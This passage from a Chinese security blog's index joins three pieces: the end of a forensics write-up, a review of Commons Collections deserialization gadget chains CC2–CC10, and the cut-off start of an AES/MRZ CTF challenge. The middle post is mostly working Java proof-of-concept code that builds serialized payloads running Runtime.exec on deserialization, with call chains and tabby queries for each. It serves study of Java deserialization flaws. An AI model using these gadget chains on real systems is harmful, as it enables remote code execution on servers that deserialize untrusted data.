wxid_op8i06j0aano22\n\n\n\n\n\n1649840939\n\n\n\n通过分析PC机我们能获得的信息其实不多，嫌疑人主要是通过PC机来连接一些数据库和服务器，以及网站管理相关，结合前面我们获得到了一个压缩包文件，大小为8.73G，很明显又是一个容器。提取出来进行分析，解压密码即为本机的开机密码12306\n火眼仿真挂载\n\n仿真之后查看用户痕迹可以发现两个可疑文件，再结合桌面上的VeraCrypt，我们无理由不怀疑这个小白鼠也是个容器文件，而key.rar为对应的密钥文件，我们尝试挂载\n\n挂载后便可以看到对应的受害者有各种的目录，也就是说这个小白鼠.txt就是我们要找的容器文件，计算一下hash\n\ncertutil -hashfile &quot;xxx&quot; SHA256\n9C4BE29EB5661E6EDD88A364ECC6EF004C15D61B08BD7DD0A393340180F15608\n\n\n\n首先，我们在管理容器中拿到了郭先生的通讯录信息，进而我们去后台网站比对一下即可\n\n15266668888\n粗心了粗心了，文件名就是。。。\n\n\n\n\n从前面目录可知有5个受害者信息\n\n\n\n解压后是一个转账的图片，计算一下哈希值即可\n\ncd62a83690a53e5b441838bc55ab83be92ff5ed26ec646d43911f119c15df510\n\n\n\n首先最直接的转账在这个容器里 2000\n其次是几个聊天记录里的转账\nQQ 600 还有两笔，其中一笔指的就是容器中的账单\n\n另外一笔比较隐晦，在检材五的数据库服务器中有记录 1000\n\n微信 2000\n\n伊对 1000\n\n共计 1000+2000+1000+600+2000=6600元\n","tags":["电子数据取证"]},{"title":"CC与tabby","url":"/2022/11/25/CC%E4%B8%8Etabby/","content":"写在前面这里收集一些CC链与tabby相关的POC、查询规则以及分析，顺便复习一下经典CC\nCC2POC：\npublic class cc2 &#123;    public static void main(String[] args) throws Exception &#123;        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;        // 恶意字节码部分构造        ClassPool classPool = ClassPool.getDefault();        classPool.appendClassPath(AbstractTranslet);        CtClass poc = classPool.makeClass(&quot;POC&quot;);        poc.setSuperclass(classPool.get(AbstractTranslet));        poc.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;);        byte[] evilCode = poc.toBytecode();        // TemplatesImpl 恶意加载类构造 sink        Object templatesImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();        Field field = templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);        field.setAccessible(true);        field.set(templatesImpl, new byte[][]&#123;evilCode&#125;);        Field field1 = templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);        field1.setAccessible(true);        field1.set(templatesImpl, &quot;whatever&quot;);        // 构造gadget来连接 TemplatesImpl#newTransformer        InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);        TransformingComparator comparator = new TransformingComparator(transformer);        // 连接compare方法        PriorityQueue queue = new PriorityQueue(2);        queue.add(1);        queue.add(2);        Field field2 = queue.getClass().getDeclaredField(&quot;comparator&quot;);        field2.setAccessible(true);        field2.set(queue, comparator);        Field field3 = queue.getClass().getDeclaredField(&quot;queue&quot;);        field3.setAccessible(true);        field3.set(queue, new Object[]&#123;templatesImpl, templatesImpl&#125;);        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;poc.out&quot;));        outputStream.writeObject(queue);        outputStream.close();        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;poc.out&quot;));        inputStream.readObject();    &#125;&#125;\n调用链如下\nObjectInputStream.readObject()-&gt;PriorityQueue.readObject()-&gt;PriorityQueue.heapify-&gt;PriorityQueue.siftDown-&gt;PriorityQueue.siftDownUsingComparator-&gt;TransformingComparator.compare()-&gt;InvokerTransformer.transform()-&gt;TemplatesImpl.getTransletInstance-&gt;(动态创建的类)cc2.newInstance()-&gt;RCE\ntabby查询\nmatch (m1:Method &#123;SIGNATURE:&quot;&lt;java.util.PriorityQueue: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL ]-&gt;(m2:Method &#123;NAME:&quot;heapify&quot;&#125;)-[:CALL ]-&gt;(m3)-[:CALL]-&gt;(m4:Method &#123;NAME:&quot;siftDownUsingComparator&quot;&#125;)-[:CALL]-&gt;(m5)-[:ALIAS*]-(m6 &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections4.comparators.TransformingComparator: int compare(java.lang.Object,java.lang.Object)&gt;&quot;&#125;)-[:CALL]-&gt;(m7)-[:ALIAS*]-(m8:Method)-[:CALL]-&gt;(m9:Method &#123;IS_SINK:true&#125;) return *\nsource点\n\n利用的比较器实现类org.apache.commons.collections4(?).comparators.TransformingComparator#compare()\n\n\nCC4poc：\npublic static void main(String[] args) throws Exception&#123;        String AbstractTranslet = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;        String TemplatesImpl = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;        ClassPool classPool = ClassPool.getDefault();        classPool.appendClassPath(AbstractTranslet);        CtClass payload = classPool.makeClass(&quot;CC4&quot;);        payload.setSuperclass(classPool.get(AbstractTranslet));        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;);        byte[] bytes = payload.toBytecode();        Object templates = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();        Field field = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);        field.setAccessible(true);        field.set(templates, new byte[][] &#123;bytes&#125;);        Field field1 = templates.getClass().getDeclaredField(&quot;_name&quot;);        field1.setAccessible(true);        field1.set(templates, &quot;test&quot;);        Transformer[] trans = &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(                        new Class[]&#123;Templates.class&#125;,                        new Object[]&#123;templates&#125;                )        &#125;;        ChainedTransformer chain = new ChainedTransformer(trans);        TransformingComparator transCom = new TransformingComparator(chain);        PriorityQueue queue = new PriorityQueue(2);        queue.add(1);        queue.add(1);        Field field2 = PriorityQueue.class.getDeclaredField(&quot;comparator&quot;);        field2.setAccessible(true);        field2.set(queue, transCom);        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;poc1.out&quot;));        outputStream.writeObject(queue);        outputStream.close();        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;poc1.out&quot;));        inputStream.readObject();    &#125;\n调用链如下\ngetTransletInstancePriorityQueue.readObject-&gt;PriorityQueue.heapify-&gt;PriorityQueue.siftDown-&gt;PriorityQueue.siftDownUsingComparator-&gt;TransformingComparator.compare-&gt;ChainedTransformer.transform-&gt;TrAXFilter(构造方法)-&gt;TemplatesImpl.newTransformer-&gt;TemplatesImpl.getTransletInstance-&gt;TemplatesImpl.defineTransletClasses-&gt;(动态创建的类)cc4.newInstance()-&gt;Runtime.exec()\nsource点与CC2相同；sink点如下，newInstance触发TrAXFilter构造方法，后面与CC2一致\n\ntabby查询(jdk8u71未出 CC4依赖)\n//cc4match (m1:Method &#123;SIGNATURE:&quot;&lt;java.util.PriorityQueue: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL ]-&gt;(m2:Method &#123;NAME:&quot;heapify&quot;&#125;)-[:CALL ]-&gt;(m3)-[:CALL ]-&gt;(m4:Method &#123;NAME:&quot;siftDownUsingComparator&quot;&#125;)-[:CALL ]-&gt;(m5)-[:ALIAS*]-(m6 &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections4.comparators.TransformingComparator: int compare(java.lang.Object,java.lang.Object)&gt;&quot;&#125;)-[:CALL ]-&gt;(m7)-[:ALIAS*]-(m8:Method)-[:CALL ]-&gt;(m9:Method &#123;NAME:&quot;newInstance&quot;&#125;) return *\nCC5poc：\nimport org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc5 &#123;    public static void main(String[] args) throws Exception &#123;        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;                        String.class, Class[].class&#125;, new Object[]&#123;                        &quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;                        Object.class, Object[].class&#125;, new Object[]&#123;                        null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;);        HashMap innerMap = new HashMap();        Map map = LazyMap.decorate(innerMap, chain);        TiedMapEntry tiedmap = new TiedMapEntry(map, &quot;123&quot;);        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(poc, tiedmap);        try &#123;            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;poc3.out&quot;));            outputStream.writeObject(poc);            outputStream.close();            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;poc3.out&quot;));            inputStream.readObject();        &#125;catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n调用链如下\nBadAttributeValueExpException.readObject-&gt;TiedMapEntry.toString-&gt;LazyMap.get-&gt;ChainedTransformer.transform-&gt;ConstantTransformer.transform-&gt;InvokerTransformer.transform-&gt;Method.invoke-&gt;Class.getMethod-&gt;InvokerTransformer.transform-&gt;Method.invoke-&gt;Runtime.getRuntime-&gt; InvokerTransformer.transform-&gt;Method.invoke-&gt;Runtime.exec\ntabby查询 （查不出）\n// cc5match path=(m1:Method &#123;SIGNATURE:&quot;&lt;javax.management.BadAttributeValueExpException: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL]-&gt;(m2:Method &#123;NAME:&quot;toString&quot;&#125;)-[:ALIAS*]-(m3:Method &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections.keyvalue.TiedMapEntry: java.lang.String toString()&gt;&quot;&#125;)-[:CALL]-&gt;(m4:Method &#123;NAME:&quot;getValue&quot;&#125;)-[:CALL]-&gt;(m5:Method &#123;NAME:&quot;get&quot;&#125;)-[:ALIAS*1..2]-(m6:Method &#123;NAME:&quot;get&quot;&#125;)-[:CALL]-&gt;(m7:Method &#123;NAME:&quot;transform&quot;&#125;)-[:ALIAS*]-(m8:Method)-[:CALL]-&gt;(m9:Method &#123;IS_SINK:true&#125;) return path\nsource点：\n\nsink点：与CC1和CC2的触发方式一致，反射调用方法\n\nCC6poc:\nimport org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.Map;public class cc6 &#123;    public static void main(String[] args) throws Exception &#123;        ChainedTransformer fake = new ChainedTransformer(new Transformer[]&#123;&#125;);        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;                        String.class, Class[].class&#125;, new Object[]&#123;                        &quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;                        Object.class, Object[].class&#125;, new Object[]&#123;                        null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        HashMap map = new HashMap();        Map innerMap = LazyMap.decorate(map, fake);        TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;key&quot;);        HashSet hashSet = new HashSet(1);        hashSet.add(tiedMapEntry);        // LazyMap#get -&gt; 判断key是否包含        innerMap.remove(&quot;key&quot;);        Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(fake, transformers);        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;poc4.out&quot;));        outputStream.writeObject(hashSet);        outputStream.close();        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;poc4.out&quot;));        inputStream.readObject();    &#125;&#125;\n调用链如下\nHashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash-&gt;TiedMapEntry.hashCode-&gt;TiedMapEntry.getValue-&gt;LazyMap.get-&gt;ChainedTransformer.transform-&gt;InvokerTransformer.transform-&gt;Runtime.exec\ntabby查询\nmatch (m1:Method &#123;SIGNATURE:&quot;&lt;java.util.HashSet: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL]-&gt;(m2:Method &#123;NAME:&quot;put&quot;&#125;)-[:CALL]-&gt;(m3:Method &#123;NAME:&quot;hash&quot;&#125;)-[:CALL]-&gt;(t)-[:ALIAS*1..3]-(m4 &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()&gt;&quot;&#125;)-[:CALL]-&gt;(m5:Method &#123;NAME:&quot;getValue&quot;&#125;)-[:CALL]-&gt;(m6)-[:ALIAS*1..3]-(m7:Method &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)&gt;&quot;&#125;)-[:CALL]-&gt;(m8)-[:ALIAS*1..3]-&gt;(m9:Method &#123;NAME:&quot;transform&quot;&#125;)-[:CALL]-&gt;(m10:Method &#123;IS_SINK:true&#125;) return *\nCC7poc：\npublic static void main(String[] args) throws Exception &#123;        ChainedTransformer fake = new ChainedTransformer(new Transformer[]&#123;&#125;);        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;                        String.class, Class[].class&#125;, new Object[]&#123;                        &quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;                        Object.class, Object[].class&#125;, new Object[]&#123;                        null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        HashMap hashMap1 = new HashMap();        HashMap hashMap2 = new HashMap();        Map map1 = LazyMap.decorate(hashMap1, fake);        map1.put(&quot;1&quot;, 1);        Map map2 = LazyMap.decorate(hashMap2, fake);        map2.put(&quot;2&quot;, 2);        Hashtable hashtable = new Hashtable();        hashtable.put(map1, 1);        hashtable.put(map2, 2);        Field field2 = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        field2.setAccessible(true);        field2.set(fake, transformers);        //上面的 hashtable.put 会使得 map2 增加一个 1，所以这里要移除        map2.remove(&quot;1&quot;);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(hashtable);        byteArrayOutputStream.flush();        byteArrayOutputStream.close();        byte[] bytes = byteArrayOutputStream.toByteArray();        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        objectInputStream.readObject();    &#125;\n调用链如下\n-&gt;Hashtable.readObject()      -&gt;Hashtable.reconstitutionPut()            -&gt;AbstractMapDecorator.equals                -&gt;AbstractMap.equals()                  -&gt;LazyMap.get.get()                    -&gt;ChainedTransformer.transform()                      -&gt;ConstantTransformer.transform()                        -&gt;InvokerTransformer.transform()\n关键触发结点：Hashtable#reconstitutionPut()\n\ntabby查询\n//cc7match path=(m1:Method &#123;SIGNATURE:&quot;&lt;java.util.Hashtable: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL ]-&gt;(m2:Method &#123;NAME:&quot;reconstitutionPut&quot;&#125;)-[:CALL ]-&gt;(m3:Method &#123;NAME:&quot;equals&quot;&#125;)-[:ALIAS*..2]-(m4:Method &#123;SIGNATURE:&quot;&lt;java.util.AbstractMap: boolean equals(java.lang.Object)&gt;&quot;&#125;)-[:CALL ]-&gt;(m5:Method &#123;NAME:&quot;get&quot;&#125;)-[:ALIAS*1..2]-(m6:Method &#123;NAME:&quot;get&quot;&#125;)-[:CALL]-&gt;(m7:Method &#123;NAME:&quot;transform&quot;&#125;)-[:ALIAS*]-(m8:Method)-[:CALL]-&gt;(m9:Method &#123;IS_SINK:true&#125;)  return path\n\nCC8poc:\npublic static void main(String[] args) throws Exception&#123;        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;        // 恶意字节码部分构造        ClassPool classPool = ClassPool.getDefault();        classPool.appendClassPath(AbstractTranslet);        CtClass poc = classPool.makeClass(&quot;POC&quot;);        poc.setSuperclass(classPool.get(AbstractTranslet));        poc.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;);        byte[] evilCode = poc.toBytecode();        // TemplatesImpl 恶意加载类构造 sink        Object templatesImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();        Field field = templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);        field.setAccessible(true);        field.set(templatesImpl, new byte[][]&#123;evilCode&#125;);        Field field1 = templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);        field1.setAccessible(true);        field1.set(templatesImpl, &quot;whatever&quot;);        // setup harmless chain        final InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);        // define the comparator used for sorting        TransformingComparator comp = new TransformingComparator(transformer);        // prepare CommonsCollections object entry point        TreeBag tree = new TreeBag(comp);        tree.add(templatesImpl);        Field field2 = InvokerTransformer.class.getDeclaredField(&quot;iMethodName&quot;);        field2.setAccessible(true);        field2.set(transformer, &quot;newTransformer&quot;);        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;poc5.out&quot;));        outputStream.writeObject(tree);        outputStream.close();        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;poc5.out&quot;));        inputStream.readObject();    &#125;\nsource点：org.apache.commons.collections4.bag#readObject()\n\n调用AbstractMapBag#doReadObject()，反序列化TemplatesImpl类对象，并put进TreeMap当中\n\nput中调用了compare，最终会调用设置的比较器类属性TransformingComparator#compare()，之后的调用链与CC2一样\n\n调用链如下\nTreeBag.readObject()    -&gt; AbstractMapBag.doReadObject    -&gt; TreeMap.put() -&gt; TreeMap.compare()    -&gt; TransformingComparator.compare() \t-&gt;TransformingComparator.compare()\t-&gt;InvokerTransformer.transform()-&gt;TemplatesImpl.getTransletInstance\t-&gt;(动态创建的类)cc2.newInstance()-&gt;RCE\ntabby查询\n//cc8match path=(m1:Method &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections4.bag.TreeBag: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL ]-&gt;(m2:Method &#123;NAME:&quot;doReadObject&quot;&#125;)-[:CALL ]-&gt;(m3:Method &#123;NAME:&quot;put&quot;&#125;)-[:ALIAS*1..4]-(m4:Method)-[:CALL ]-&gt;(m5:Method &#123;NAME:&quot;compare&quot;&#125;)-[:CALL ]-&gt;(m6:Method)-[:ALIAS*]-(m7:Method &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections4.comparators.TransformingComparator: int compare(java.lang.Object,java.lang.Object)&gt;&quot;&#125;)-[:CALL ]-&gt;(m8)-[:ALIAS*]-(m9:Method)-[:CALL*..5 ]-&gt;(m10:Method &#123;IS_SINK:true&#125;) return path\n\nCC9poc:\npublic static void main(String[] args) throws Exception&#123;        ChainedTransformer fake = new ChainedTransformer(new Transformer[]&#123;&#125;);        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;                        String.class, Class[].class&#125;, new Object[]&#123;                        &quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;                        Object.class, Object[].class&#125;, new Object[]&#123;                        null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        HashMap map = new HashMap();        Map innerMap = LazyMap.decorate(map, fake);        TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;foo&quot;);        Hashtable hashtable = new Hashtable();        hashtable.put(&quot;foo&quot;, 1);        Field field = Hashtable.class.getDeclaredField(&quot;table&quot;);        field.setAccessible(true);        Object[] table = (Object[]) field.get(hashtable);        Object entry1 = table[0];        if(entry1 == null) &#123;            entry1 = table[1];        &#125;        Field key = entry1.getClass().getDeclaredField(&quot;key&quot;);        key.setAccessible(true);        key.set(entry1, tiedMapEntry);        Field field2 = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        field2.setAccessible(true);        field2.set(fake, transformers);        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;poc4.out&quot;));        outputStream.writeObject(hashtable);        outputStream.close();        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;poc4.out&quot;));        inputStream.readObject();    &#125;\n区别：Hashtable#reconstitutionPut\n\n调用链如下\nHashtable.readObject()    -&gt; Hashtable.reconstitutionPut    -&gt; key.hashCode() =&gt; TiedMapEntry.hashCode()    -&gt; TiedMapEntry.getValue    -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()    -&gt; factory.transform() =&gt; ChainedTransformer.transform()    -&gt; 前文构造的Runtime.getRuntime().exec()\ntabby查询\n// CC9match (m1:Method &#123;SIGNATURE:&quot;&lt;java.util.Hashtable: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL]-&gt;(m2:Method &#123;NAME:&quot;reconstitutionPut&quot;&#125;)-[:CALL]-&gt;(m3)-[:ALIAS*1..3]-(m4 &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()&gt;&quot;&#125;)-[:CALL]-&gt;(m5:Method &#123;NAME:&quot;getValue&quot;&#125;)-[:CALL]-&gt;(m6)-[:ALIAS*1..3]-(m7:Method &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)&gt;&quot;&#125;)-[:CALL]-&gt;(m8)-[:ALIAS*1..3]-&gt;(m9:Method &#123;NAME:&quot;transform&quot;&#125;)-[:CALL]-&gt;(m10:Method &#123;IS_SINK:true&#125;) return *\n\n调用模板\n//cc9match path=(m1:Method &#123;SIGNATURE:&quot;&lt;java.util.Hashtable: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL]-&gt;(m2:Method &#123;NAME:&quot;reconstitutionPut&quot;&#125;)-[:CALL]-&gt;(m3:Method &#123;NAME:&quot;hashCode&quot;&#125;)-[:ALIAS*]-(m4:Method &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()&gt;&quot;&#125;)-[:CALL]-&gt;(m5:Method &#123;NAME:&quot;getValue&quot;&#125;)-[:CALL]-&gt;(m6:Method &#123;NAME:&quot;get&quot;&#125;)-[:ALIAS*1..2]-(m7:Method &#123;NAME:&quot;get&quot;&#125;)-[:CALL]-&gt;(m8:Method &#123;NAME:&quot;transform&quot;&#125;)-[:ALIAS*]-(m9:Method)-[:CALL]-&gt;(m10:Method &#123;IS_SINK:true&#125;) return path\nCC10poc:\npublic static void main(String[] args) throws Exception&#123;        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;        // 恶意字节码部分构造        ClassPool classPool = ClassPool.getDefault();        classPool.appendClassPath(AbstractTranslet);        CtClass poc = classPool.makeClass(&quot;POC&quot;);        poc.setSuperclass(classPool.get(AbstractTranslet));        poc.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;);        byte[] evilCode = poc.toBytecode();        // TemplatesImpl 恶意加载类构造 sink        Object templatesImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();        Field field = templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);        field.setAccessible(true);        field.set(templatesImpl, new byte[][]&#123;evilCode&#125;);        Field field1 = templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);        field1.setAccessible(true);        field1.set(templatesImpl, &quot;whatever&quot;);        // mock method name until armed        final InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);        HashMap innerMap = new HashMap();        Map lazyMap = LazyMap.decorate(innerMap, transformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templatesImpl);        HashSet map = new HashSet(1);        map.add(&quot;foo&quot;);        Field f = null;        try &#123;            f = HashSet.class.getDeclaredField(&quot;map&quot;);        &#125; catch (NoSuchFieldException e) &#123;            f = HashSet.class.getDeclaredField(&quot;backingMap&quot;);        &#125;        f.setAccessible(true);        HashMap innimpl = null;        innimpl = (HashMap) f.get(map);        Field f2 = null;        try &#123;            f2 = HashMap.class.getDeclaredField(&quot;table&quot;);        &#125; catch (NoSuchFieldException e) &#123;            f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);        &#125;        f2.setAccessible(true);        Object[] array = new Object[0];        array = (Object[]) f2.get(innimpl);        Object node = array[0];        if(node == null) &#123;            node = array[1];        &#125;        Field keyField = null;        try &#123;            keyField = node.getClass().getDeclaredField(&quot;key&quot;);        &#125;catch (Exception e) &#123;            Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);        &#125;        keyField.setAccessible(true);        keyField.set(node, tiedMapEntry);        Field field2 =  InvokerTransformer.class.getDeclaredField(&quot;iMethodName&quot;);        field2.setAccessible(true);        field2.set(transformer, &quot;newTransformer&quot;);        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;poc4.out&quot;));        outputStream.writeObject(map);        outputStream.close();        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;poc4.out&quot;));        inputStream.readObject();    &#125;\n调用链如下，与CC6一样，只是sink点利用方式不同\njava.io.ObjectInputStream.readObject()            java.util.HashSet.readObject()                java.util.HashMap.put()                java.util.HashMap.hash()                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()                        org.apache.commons.collections.map.LazyMap.get()                                             InvokerTransformer.transform()                            java.lang.reflect.Method.invoke()                                ... templates gadgets ...                                    java.lang.Runtime.exec()\ntabby查询\n//cc10match (source:Method &#123;SIGNATURE:&quot;&lt;java.util.HashSet: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL]-&gt;(m2:Method) where (m2.NAME in [&quot;defaultReadObject&quot;,&quot;readFloat&quot;,&quot;readObject&quot;])=falsematch (sink:Method &#123;IS_SINK:true,NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method &#123;NAME:&quot;transform&quot;&#125;)call apoc.algo.allSimplePaths(m1, m2, &quot;&lt;CALL|ALIAS&quot;, 10) yield pathreturn * limit 20\n//cc10match path=(source:Method &#123;SIGNATURE:&quot;&lt;java.util.HashSet: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL]-&gt;(m2:Method &#123;SIGNATURE: &quot;&lt;java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)&gt;&quot;&#125;)-[:CALL]-&gt;(m3:Method &#123;NAME:&quot;hash&quot;&#125;)-[:CALL]-&gt;(m4:Method &#123;NAME:&quot;hashCode&quot;&#125;)-[:ALIAS*1..3]-(m5:Method &#123;SIGNATURE:&quot;&lt;org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()&gt;&quot;&#125;)-[:CALL]-&gt;(m6:Method &#123;NAME:&quot;getValue&quot;&#125;)-[:CALL]-&gt;(m7:Method &#123;NAME:&quot;get&quot;&#125;)-[:ALIAS*1..2]-(m8:Method &#123;NAME:&quot;get&quot;&#125;)-[:CALL]-&gt;(m9:Method &#123;NAME:&quot;transform&quot;&#125;)-[:ALIAS*]-(m10:Method)-[:CALL]-&gt;(m11:Method &#123;IS_SINK:true&#125;)  return path\n","tags":["JAVA安全"]},{"title":"AES key -- encoded in the machine readable zone of a European ePassport","url":"/2022/10/07/AES%20key%20--%20encoded%20in%20the%20machine%20readable%20zone%20of%20a%20European%20ePassport/","content":"Description\nAn AES encrypted message has been forwarded to you (CBC mode with zero initialization vector and 01-00 padding). Additionally, you have received the corresponding key 一 unfortunately not quite com\u001fplete -in a form like a machine readable zone (MRZ) on an identity document as it is used e.g. with ePassports in 